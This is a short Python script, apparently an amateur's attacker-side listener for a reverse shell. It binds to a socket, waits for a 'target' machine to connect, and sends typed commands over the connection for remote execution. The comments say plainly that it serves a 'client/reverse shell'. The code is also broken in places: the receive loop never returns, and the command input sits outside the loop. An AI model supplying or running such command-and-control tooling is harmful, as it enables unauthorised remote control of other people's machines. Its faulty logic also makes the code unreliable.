#!/usr/bin/python
import socket
import json

#It allows us to send large bytes of data
def relaible_send(data):
	global json_data
	json_data=json.dumps(data).encode('utf-8')
	target.send(json_data)

#allows us to recieve large bytes ofdata 
def relaible_recv():
	json_data=""
	while True:
		try:
			json_data=json_data+str(target.recv(1024))
			print(json.loads(json_data))
		except ValueError:
			continue

#allows us to execute commands on the client/reverse shell
def shell():
	command=raw_input("#~"+str(ip))
	while True:
		relaible_send(command)
		if command=='q':
			break

		elif command=='cd' and len(command)>1:
			continue

		else:
			result=relaible_recv()
			print(result)

#It accepts the connection from the client/reverse shell
def server():
	global s
	global ip
	global target
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(("<ip addr>",54321))
	s.listen(5)
	print("Listening for incoming connections...")
	target,ip=s.accept()
	print("Target Connected!")

server()
shell()
s.close()
